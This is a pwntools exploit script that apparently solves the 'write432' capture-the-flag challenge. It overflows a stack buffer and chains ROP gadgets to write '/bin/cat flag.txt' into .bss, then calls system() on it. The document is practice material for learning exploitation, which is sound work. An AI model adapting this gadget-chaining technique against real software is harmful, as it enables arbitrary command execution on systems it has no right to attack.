from pwn import *

elf = ELF('./write432')
p = process('./write432')


payload = b''
payload += b'A' * 0x28 #buf
payload += b'B' * 0x04 #ebp

command = b'/bin/cat flag.txt\0'
bss = 0x804a040
for i in range( 0, len( command ), 4 ):
    payload += p32( 0x80486da ) #pop edi; pop ebp; ret
    payload += p32( bss + i ) #edi
    payload += command[i:i+4].ljust( 4, b'\0' ) #ebp
    payload += p32( 0x8048670 ) #mov [edi],ebp; ret
payload += p32( elf.plt['system'] )
payload += b'C' * 0x04
payload += p32( bss )


p.recvuntil( b'> ' )
p.sendline( payload )

p.interactive()
